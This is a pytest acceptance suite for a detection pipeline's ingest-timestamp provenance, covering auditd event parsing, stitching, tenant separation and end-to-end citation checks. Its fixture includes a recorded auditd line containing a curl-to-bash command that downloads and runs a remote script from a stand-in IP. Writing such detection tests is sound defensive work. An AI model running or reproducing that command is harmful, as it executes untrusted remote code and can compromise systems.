"""D11 · ingest-path provenance acceptance.

The gate this suite holds the code to: a collector-delivered event must be
able to say, separately and without fabrication,

    WHEN the activity happened          activity_occurred_at
    WHEN the source saw it              sensor_observed_at
    WHEN the collector took delivery    collector_received_at
    WHEN NivX accepted it               nivx_received_at
    WHEN we parsed it                   parsed_at
    WHEN we normalized it               normalized_at
    WHEN the rules ran                  rule_evaluated_at
    WHEN the verdict became final       verdict_at

and, for each, WHERE the value came from. A boundary that was not observed
must stay NOT_OBSERVED; it may never borrow a neighbouring stage's value.

EVIDENCE LABELLING
  REPLAYED REAL EVIDENCE — `REAL_EXECVE` is the verbatim auditd line already
  present in stored canonical evidence from the earlier acceptance run.
  TEST/SYNTHETIC — the SYSCALL/PROCTITLE companions and every envelope built
  here. Neither is live telemetry; no live auditd host is connected and
  nothing here touches production.
"""
from __future__ import annotations

import asyncio

import pytest

from detection_content.telemetry.auditd_stitcher import plan_stitch
from detection_content.telemetry.linux_auditd_dsm import LinuxAuditdDSM
from routers.xdr_ingest import (CanonicalEnvelope, _ingest_provenance_for,
                                _raw_event_for_pipeline)
from services import ingest_provenance as ing
from services import provenance_timestamps as pts

DSM = LinuxAuditdDSM()
AUD = "1757452888.555:9002"

# REPLAYED REAL EVIDENCE (verbatim)
REAL_EXECVE = (f'type=EXECVE msg=audit({AUD}): argc=3 a0="/bin/bash" '
               f'a1="-c" a2="curl -s http://198.51.100.9/x.sh | bash"')
# TEST/SYNTHETIC companions — the records auditd genuinely emits alongside it
SYSCALL = (f'node=web-prod-04 type=SYSCALL msg=audit({AUD}): arch=c000003e '
           f'syscall=59 success=yes exit=0 ppid=1234 pid=5678 auid=1000 '
           f'uid=0 euid=0 comm="bash" exe="/usr/bin/bash" key="exec"')
PROCTITLE = (f'type=PROCTITLE msg=audit({AUD}): '
             f'proctitle=2F62696E2F62617368002D63')

NIVX_RECV = "2026-06-01T10:00:03.500000+00:00"


# ── helpers ──────────────────────────────────────────────────────────
def envelope(line: str, *, tenant="t-d11", collector="col-d11", **over):
    body = {"tenant_id": tenant, "collector_id": collector,
            "collection_method": "syslog", "source": "web-prod-04",
            "raw": {"line": line, "message": line}}
    body.update(over)
    return CanonicalEnvelope(**body)


def prov_for(e: CanonicalEnvelope, *, recv=NIVX_RECV, raw_ref=None):
    return _ingest_provenance_for(e, nivx_received_at=recv,
                                  tenant_id=e.tenant_id, raw_ref=raw_ref)


def normalize(e: CanonicalEnvelope, *, recv=NIVX_RECV, raw_ref=None,
              stitch_lines=None):
    """Drive one envelope through parse → normalize exactly as the pipeline
    does, including the ingest provenance the handler supplies."""
    raw_event = _raw_event_for_pipeline(e)
    ip = prov_for(e, recv=recv, raw_ref=raw_ref) if recv else {}
    if stitch_lines:
        p = plan_stitch(stitch_lines, [e.tenant_id] * len(stitch_lines),
                        [e.collector_id] * len(stitch_lines))
        st = list(p["stitched"].values())[0]
        raw_event = {**raw_event, **st, "line": st["_primary_line"],
                     "message": st["_primary_line"]}
    parsed = DSM.select_parser().parse(raw_event)
    canonical = DSM.select_normalizer().normalize(
        parsed, DSM.id, e.collector_id, "int-d11", "trace-d11",
        tenant_id=e.tenant_id)
    ing.apply(canonical, ip.get("timestamps") or {})
    canonical.setdefault("provenance", {})["ingest"] = ip.get("identity")
    return canonical


def stamps(canonical):
    return canonical["provenance"]["timestamps"]


# ── 1 · source timestamp available ───────────────────────────────────
def test_source_timestamp_is_the_sensor_observation_boundary():
    c = normalize(envelope(SYSCALL,
                           source_timestamp="2026-06-01T10:00:01+00:00"))
    s = stamps(c)["sensor_observed_at"]
    assert s["status"] == pts.AVAILABLE
    assert s["value"] == "2026-06-01T10:00:01+00:00"
    assert s["source"] == "collector:envelope.source_timestamp"


# ── 2 · source timestamp absent ──────────────────────────────────────
def test_absent_source_timestamp_stays_not_observed():
    s = stamps(normalize(envelope(SYSCALL)))["sensor_observed_at"]
    assert s["status"] == pts.NOT_OBSERVED
    assert s["value"] is None
    assert s["reason"]
    # and it did NOT quietly become the receipt or the activity time
    assert s.get("value") != NIVX_RECV


# ── 3 · collector timestamp available ────────────────────────────────
@pytest.mark.parametrize("field,expect_source", [
    ("received_at", "collector:envelope.received_at"),
    ("collection_timestamp", "collector:envelope.collection_timestamp"),
])
def test_collector_receipt_boundary_records_its_own_source(field,
                                                           expect_source):
    c = normalize(envelope(SYSCALL, **{field: "2026-06-01T10:00:02+00:00"}))
    s = stamps(c)["collector_received_at"]
    assert s["status"] == pts.AVAILABLE
    assert s["value"] == "2026-06-01T10:00:02+00:00"
    assert s["source"] == expect_source


def test_received_at_wins_over_collection_timestamp_by_declared_precedence():
    c = normalize(envelope(SYSCALL, received_at="2026-06-01T10:00:02+00:00",
                           collection_timestamp="2026-06-01T10:00:09+00:00"))
    s = stamps(c)["collector_received_at"]
    assert s["value"] == "2026-06-01T10:00:02+00:00"
    assert s["source"] == "collector:envelope.received_at"


# ── 4 · collector timestamp absent ───────────────────────────────────
def test_absent_collector_timestamp_never_borrows_the_nivx_receipt():
    s = stamps(normalize(envelope(SYSCALL)))["collector_received_at"]
    assert s["status"] == pts.NOT_OBSERVED
    assert s["value"] is None


# ── 5 · direct sensor path has no collector stage ────────────────────
def test_direct_sensor_path_reports_not_applicable_not_not_observed():
    s = ing.transport_stamps({}, nivx_received_at=NIVX_RECV,
                             path_kind=ing.DIRECT_SENSOR)
    assert s["collector_received_at"]["status"] == pts.NOT_APPLICABLE
    assert s["collector_received_at"]["value"] is None
    assert s["nivx_received_at"]["status"] == pts.AVAILABLE


# ── 6 · collector-delivered path ─────────────────────────────────────
def test_nivx_receipt_is_the_http_boundary_and_says_so():
    c = normalize(envelope(SYSCALL))
    s = stamps(c)["nivx_received_at"]
    assert s["status"] == pts.AVAILABLE and s["value"] == NIVX_RECV
    assert s["source"] == ("ingest:http receipt "
                           "POST /api/xdr/ingest/telemetry")
    ident = c["provenance"]["ingest"]
    assert ident["path_kind"] == ing.COLLECTOR_DELIVERED
    assert ident["collector_id"] == "col-d11"
    assert "verified against xdr_collectors.tenant_id" \
        in ident["collector_id_source"]
    assert ident["tenant_id"] == "t-d11"
    assert "X-Tenant-Id" in ident["tenant_id_source"]
    # the collector's origin label is a CLAIM, never proven host identity
    assert "CLAIM" in ident["source_label_source"]


def test_no_receipt_supplied_means_no_ingest_provenance_is_invented():
    c = normalize(envelope(SYSCALL), recv=None)
    ts = stamps(c)
    assert c["provenance"]["ingest"] is None
    # the transport boundaries stay honestly unknown — nothing is guessed
    assert ts["collector_received_at"]["status"] == pts.MISSING
    assert ts["nivx_received_at"]["status"] == pts.MISSING


# ── 7 · malformed source timestamp ───────────────────────────────────
@pytest.mark.parametrize("bad", ["not-a-time", "1757452888.555", "",
                                 "2026-13-45T99:99:99Z", "null"])
def test_malformed_timestamps_never_become_available(bad):
    c = normalize(envelope(SYSCALL, source_timestamp=bad,
                           received_at=bad))
    for name in ("sensor_observed_at", "collector_received_at"):
        s = stamps(c)[name]
        assert s["status"] in (pts.MISSING, pts.NOT_OBSERVED)
        assert s["value"] is None
        assert s["reason"]


def test_a_supplied_but_unreadable_value_is_missing_not_not_observed():
    c = normalize(envelope(SYSCALL, received_at="yesterday"))
    s = stamps(c)["collector_received_at"]
    assert s["status"] == pts.MISSING
    assert "not a parseable ISO-8601" in s["reason"]


def test_a_broken_collector_outranks_the_dsm_not_observed_placeholder():
    # auditd itself has no daemon observation time, so the normalizer seeds
    # NOT_OBSERVED. A collector that DID send a value and sent rubbish must
    # not be hidden behind that placeholder.
    c = normalize(envelope(SYSCALL, source_timestamp="yesterday afternoon"))
    s = stamps(c)["sensor_observed_at"]
    assert s["status"] == pts.MISSING
    assert s["source"] == "collector:envelope.source_timestamp"
    assert "not a parseable ISO-8601" in s["reason"]


def test_a_placeholder_can_never_demote_a_real_measurement():
    c = normalize(envelope(SYSCALL))
    before = dict(stamps(c)["activity_occurred_at"])
    assert before["status"] == pts.AVAILABLE
    ing.apply(c, {"activity_occurred_at": pts.stamp(
        status=pts.NOT_OBSERVED, reason="a later, less informed producer")})
    assert stamps(c)["activity_occurred_at"] == before


def test_unreadable_first_candidate_does_not_hide_a_good_second_one():
    c = normalize(envelope(SYSCALL, received_at="yesterday",
                           collection_timestamp="2026-06-01T10:00:02+00:00"))
    s = stamps(c)["collector_received_at"]
    assert s["status"] == pts.AVAILABLE
    assert s["source"] == "collector:envelope.collection_timestamp"


# ── 8 · timezone / offset handling ───────────────────────────────────
def test_offset_is_preserved_verbatim_and_never_rewritten():
    c = normalize(envelope(SYSCALL,
                           source_timestamp="2026-06-01T12:00:01+02:00"))
    s = stamps(c)["sensor_observed_at"]
    assert s["value"] == "2026-06-01T12:00:01+02:00"
    assert not s.get("reason")


def test_missing_offset_is_flagged_and_no_offset_is_assumed():
    c = normalize(envelope(SYSCALL,
                           source_timestamp="2026-06-01T10:00:01"))
    s = stamps(c)["sensor_observed_at"]
    assert s["status"] == pts.AVAILABLE
    assert s["value"] == "2026-06-01T10:00:01"      # not silently suffixed
    assert "offset is UNKNOWN" in s["reason"]


def test_zulu_is_accepted_and_kept_as_written():
    c = normalize(envelope(SYSCALL, source_timestamp="2026-06-01T10:00:01Z"))
    s = stamps(c)["sensor_observed_at"]
    assert s["status"] == pts.AVAILABLE and s["value"] == \
        "2026-06-01T10:00:01Z"


# ── 9 · duplicate / replayed delivery ────────────────────────────────
def test_replayed_delivery_yields_identical_activity_time_and_event_id():
    a = normalize(envelope(SYSCALL), recv="2026-06-01T10:00:03+00:00")
    b = normalize(envelope(SYSCALL), recv="2026-06-01T11:59:59+00:00")
    assert a["event_id"] == b["event_id"]
    assert stamps(a)["activity_occurred_at"] == \
        stamps(b)["activity_occurred_at"]
    # the receipt boundary DID move — it is a different delivery
    assert stamps(a)["nivx_received_at"]["value"] != \
        stamps(b)["nivx_received_at"]["value"]


# ── 10 · cross-tenant identical content ──────────────────────────────
def test_identical_content_in_two_tenants_stays_two_events_one_activity():
    a = normalize(envelope(SYSCALL, tenant="t-alpha"))
    b = normalize(envelope(SYSCALL, tenant="t-beta"))
    assert a["event_id"] != b["event_id"]
    assert stamps(a)["activity_occurred_at"]["value"] == \
        stamps(b)["activity_occurred_at"]["value"]
    assert a["provenance"]["ingest"]["tenant_id"] == "t-alpha"
    assert b["provenance"]["ingest"]["tenant_id"] == "t-beta"


# ── 11 · stitched audit event ────────────────────────────────────────
def test_stitched_event_takes_activity_time_from_the_audit_header():
    c = normalize(envelope(SYSCALL),
                  stitch_lines=[SYSCALL, REAL_EXECVE, PROCTITLE])
    a = stamps(c)["activity_occurred_at"]
    assert a["status"] == pts.AVAILABLE
    assert a["source"] == "auditd:msg=audit(epoch:serial)"
    assert a["value"].startswith("2025-09-09T")     # 1757452888 UTC
    assert c["additional_fields"]["event_time_basis"] == "ACTIVITY_TIME"
    assert c["additional_fields"]["event_time_substituted"] is False
    assert c["additional_fields"]["audit_timestamp_state"] == "OBSERVED"
    assert c["event_time"] == a["value"]
    # D4 survives
    assert c["additional_fields"]["stitched"] is True
    assert c["additional_fields"]["stitch_completeness"] == "COMPLETE"


# ── 12 · unstitched partial audit event ──────────────────────────────
def test_unstitched_partial_uses_the_same_provenance_model():
    c = normalize(envelope(REAL_EXECVE))
    a = stamps(c)["activity_occurred_at"]
    assert a["status"] == pts.AVAILABLE
    assert a["source"] == "auditd:msg=audit(epoch:serial)"
    assert c["additional_fields"]["event_time_basis"] == "ACTIVITY_TIME"
    # D3 survives: a lone EXECVE is still an execution
    assert c["event_type"] == "process_execution"


def test_sensor_observation_is_not_observed_for_auditd_by_default():
    s = stamps(normalize(envelope(SYSCALL)))["sensor_observed_at"]
    assert s["status"] == pts.NOT_OBSERVED
    assert "no separate daemon observation time" in s["reason"]


def test_malformed_audit_header_is_declared_not_substituted_silently():
    line = ('type=SYSCALL msg=audit(BROKEN:9002): syscall=59 uid=0 '
            'comm="bash" exe="/usr/bin/bash"')
    c = normalize(envelope(line))
    a = stamps(c)["activity_occurred_at"]
    assert a["status"] == pts.NOT_OBSERVED
    assert "audit_timestamp_state=MALFORMED" in a["reason"]
    af = c["additional_fields"]
    assert af["event_time_basis"] == "INGEST_TIME_SUBSTITUTED"
    assert af["event_time_substituted"] is True
    assert af["audit_timestamp_state"] == "MALFORMED"
    # the substituted compatibility value is NOT the activity time, and is
    # NOT the ingest receipt either
    assert c["event_time"] != NIVX_RECV
    assert a["value"] is None


def test_no_boundary_ever_equals_another_by_substitution():
    c = normalize(envelope(SYSCALL, source_timestamp=None))
    ts = stamps(c)
    assert ts["activity_occurred_at"]["value"] != \
        ts["nivx_received_at"]["value"]
    for name in ("activity_occurred_at", "sensor_observed_at",
                 "collector_received_at"):
        assert ts[name]["value"] != NIVX_RECV


def test_all_eight_boundaries_are_present_and_none_is_silently_omitted():
    ts = stamps(normalize(envelope(SYSCALL)))
    assert set(ts) == set(pts.STAMP_NAMES)
    for name, s in ts.items():
        assert s["status"] in (pts.AVAILABLE, pts.NOT_APPLICABLE,
                               pts.NOT_OBSERVED, pts.MISSING)
        if s["status"] == pts.AVAILABLE:
            assert s["value"] and s["source"]
        else:
            assert s["value"] is None


# ── 13 + 14 · end to end: D8 citation and raw drill-down ─────────────
# The real pipeline, the real engines, a real MongoDB — in a throwaway
# database, so nothing here can touch preview or production data.
TEST_DB = "nivx_d11_ingest_provenance_test"


def _run_pipeline(e: CanonicalEnvelope, *, stitch_lines=None):
    import os

    from motor.motor_asyncio import AsyncIOMotorClient

    from detection_content.xdr_pipeline import (
        process_event_through_pipeline)
    raw_ref = {"collection": "xdr_canonical_events", "id": "raw-row-1",
               "state": "PERSISTED_BY_THIS_REQUEST"}
    raw_event = _raw_event_for_pipeline(e)
    prov = prov_for(e, raw_ref=raw_ref)
    if stitch_lines:
        p = plan_stitch(stitch_lines, [e.tenant_id] * len(stitch_lines),
                        [e.collector_id] * len(stitch_lines))
        st = list(p["stitched"].values())[0]
        raw_event = {**raw_event, **st, "line": st["_primary_line"],
                     "message": st["_primary_line"]}

    async def _go():
        client = AsyncIOMotorClient(os.environ["MONGO_URL"])
        db = client[TEST_DB]
        try:
            res = await process_event_through_pipeline(
                db, raw_event, "trace-d11-e2e", integration_id="int-d11",
                collector_id=e.collector_id, tenant_id=e.tenant_id,
                ingest_provenance=prov)
            stored = await db["xdr_canonical_evidence"].find_one(
                {"event_id": res["canonical"]["event_id"]})
            cits = await db["xdr_detection_matches"].find(
                {"canonical_event_id": res["canonical"]["event_id"]}
            ).to_list(length=100)
            return res, stored, cits
        finally:
            await client.drop_database(TEST_DB)
            client.close()

    return asyncio.run(_go())


def test_end_to_end_stamps_every_stage_and_keeps_d8_citations():
    res, stored, cits = _run_pipeline(
        envelope(SYSCALL, tenant="t-d11-e2e"),
        stitch_lines=[SYSCALL, REAL_EXECVE, PROCTITLE])
    canonical = res["canonical"]
    ts = canonical["provenance"]["timestamps"]

    # every stage NivX genuinely performed is measured, by itself
    for name in ("parsed_at", "normalized_at", "nivx_received_at"):
        assert ts[name]["status"] == pts.AVAILABLE, (name, ts[name])
    assert ts["parsed_at"]["source"].startswith("pipeline:parser:")
    assert ts["normalized_at"]["source"].startswith("pipeline:normalizer:")
    assert ts["activity_occurred_at"]["status"] == pts.AVAILABLE

    # the stages are ordered as they happened, not as convenient
    assert ts["activity_occurred_at"]["value"] < ts["parsed_at"]["value"]
    assert ts["nivx_received_at"]["value"] < ts["parsed_at"]["value"]
    assert ts["parsed_at"]["value"] <= ts["normalized_at"]["value"]

    # 13 · D8 citations still produced, after the provenance changes
    assert cits, "no detection citation was persisted"
    assert all(r["canonical_event_id"] == canonical["event_id"]
               for r in cits)
    assert all(r["tenant_id"] == "t-d11-e2e" for r in cits)

    # 14 · raw evidence drill-down: citation -> canonical -> raw row and
    # every contributing audit record
    ident = canonical["provenance"]["ingest"]
    assert ident["raw_envelope_ref"]["id"] == "raw-row-1"
    assert ident["raw_envelope_ref"]["collection"] == "xdr_canonical_events"
    refs = canonical["evidence_refs"]
    assert {r["record_type"] for r in refs} == {"SYSCALL", "EXECVE",
                                                "PROCTITLE"}
    assert all(r["line"] for r in refs)
    assert canonical["raw_ref"]["line"] == SYSCALL

    # the persisted row carries the same provenance, not a rebuilt one
    assert stored is not None
    assert stored["provenance"]["ingest"]["raw_envelope_ref"]["id"] == \
        "raw-row-1"


def test_end_to_end_verdict_and_rule_stamps_are_appended_not_rewritten():
    res, stored, _ = _run_pipeline(
        envelope(SYSCALL, tenant="t-d11-e2e2"),
        stitch_lines=[SYSCALL, REAL_EXECVE, PROCTITLE])
    assert stored is not None, "canonical evidence was not persisted"
    ts = stored["provenance"]["timestamps"]
    assert ts["rule_evaluated_at"]["status"] == pts.AVAILABLE
    assert ts["verdict_at"]["status"] == pts.AVAILABLE
    # the ingest-side stamps survived the append
    assert ts["nivx_received_at"]["value"] == NIVX_RECV
    assert ts["activity_occurred_at"]["source"] == \
        "auditd:msg=audit(epoch:serial)"
    assert ts["normalized_at"]["value"] <= ts["rule_evaluated_at"]["value"]
    assert ts["rule_evaluated_at"]["value"] <= ts["verdict_at"]["value"]
